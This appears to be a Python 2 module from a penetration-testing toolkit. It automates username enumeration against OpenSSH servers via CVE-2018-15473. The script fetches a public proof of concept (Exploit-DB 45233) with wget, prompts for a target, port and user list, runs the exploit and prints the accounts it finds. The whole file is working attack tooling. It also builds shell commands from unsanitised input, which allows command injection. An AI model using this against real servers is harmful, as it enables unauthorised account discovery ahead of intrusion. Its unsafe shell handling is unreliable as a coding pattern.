#!/usr/bin/env python
# path01: openssh enum bug

# --- imports ---
import subprocess


# --- super colours ---
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'



def enum():
  print OKGREEN + '  [+] path 1: openssh enum bug' + ENDC
  print ''

  print OKGREEN + '      preparing...' + ENDC

  grab_or_not = raw_input('      using tool [local/wget]: ')
  pocpath = '/tmp/45233.py'

  if grab_or_not == 'wget':
    # grab poc from EDB:45233; CVE-2018-15473
    getpoc = 'wget --no-check-certificate https://www.exploit-db.com/download/45233 -O ' + pocpath
    subprocess.call([ getpoc ],shell=True)
    print '' + OKGREEN
    print '      poc should be ready to configure...' + ENDC

  elif grab_or_not == 'local':
    print '      [1] /tmp/45233.py ("default")'
    print '      [2] </your/full/path/to/po.c'

    choice = raw_input('      [1/2]: ? ')
    if choice == '1': 
      pocpath = '/tmp/45233.py'

    elif choice == '2':
      pocpath = raw_input('  type full path to ssh enum poc >> ')


  print BOLD
  target = raw_input('    set target: ')
  port = raw_input('    set port: ')
  threads = 2
  outputFile = 'ssh-enum-bug-'+target+'.log'
  userlist = raw_input('    (full path to) userlist: ')
  print ENDC

  runEnumPoc = 'python ' + pocpath + ' --port ' + port
  runEnumPoc += ' --threads 2 --outputFile /tmp/' + outputFile
  runEnumPoc += ' --userList ' + userlist + ' ' + target
  subprocess.call([ runEnumPoc ], shell=True)

  print OKGREEN + '\n  [+] poc finished, checking results:' + ENDC
  enumusers = '/tmp/'+outputFile
  readusers = open(enumusers,'r')
  lines = readusers.read()
  print '\n' + lines
  readusers.close()

  print '\n' + OKGREEN
  print '  [+] path 1: openssh enum - finished.\n' + ENDC


